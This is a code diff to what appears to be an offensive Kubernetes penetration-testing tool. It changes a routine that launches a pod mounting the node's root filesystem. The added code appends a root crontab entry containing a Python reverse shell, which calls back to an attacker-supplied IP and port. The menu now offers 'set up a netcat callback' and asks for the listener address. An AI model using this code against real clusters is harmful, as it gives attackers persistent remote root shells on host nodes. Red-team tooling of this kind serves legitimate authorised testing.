@@ -575,9 +575,8 @@ func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
 	}
 }
 
-func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
+func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
 	var MountInfoVars = MountInfo{}
-	println("test-1")
 	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.
 
 	// First, confirm we're allowed to create pods
@@ -585,7 +584,6 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	//	println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
 	//	return
 	//}
-	println("test-2")
 	// TODO: changing parsing to occur via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image
 
@@ -595,7 +593,6 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo) {
 	approach1_success := false
 	var image string
 	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
-	println("test-3")
 	if err != nil {
 		approach1_success = false
 		println("DEBUG: describe pod didn't work")
@@ -704,18 +701,17 @@ spec:
 		time.Sleep(5 * time.Second)
 		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
-		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.23.58.141\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh -i\"]);'")
+		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
 		stdout := bytes.Buffer{}
 		stderr := bytes.Buffer{}
-		fmt.Println("Testing1")
-		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "touch /foo && cat >> /root/etc/crontab")
-		fmt.Println("Testing2")
+		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")
 
 		if err != nil {
 			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
 			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
 			return
 		} else {
+			println("Netcat callback added sucessfully.")
 			//println(string(shadowFileBs))
 		}
 	}
@@ -1048,7 +1044,7 @@ Namespaces, Service Accounts and Roles |
 Vulnerabilities and Misconfiguration Searching |
 -----------------------------------------------+
 [10] Check all pods for volume mounts
-[11] Launch a pod mounting its node's host filesystem
+[11] Launch a pod mounting its node's host filesystem and set up a netcat callback
 [12] Request list of pods from a Kubelet [not yet implemented]
 ------------------------------------------------+
 Cloud-specific Credential Gathering             |
@@ -1277,8 +1273,13 @@ Peirates:># `)
 			//	break
 			//}
 			//crontab_persist_exec(allPods, connectionString)
-			MountRootFS(allPods, connectionString)
-			fmt.Scanln(&user_response)
+			println("What IP and Port will your netcat listener be listening on?")
+			var ip, port string
+			println("IP:")
+			fmt.Scanln(&ip)
+			println("Port:")
+			fmt.Scanln(&port)
+			MountRootFS(allPods, connectionString, ip, port)
 			break
 
 		// [13] Request IAM credentials from AWS Metadata API [AWS only] [not yet implemented]
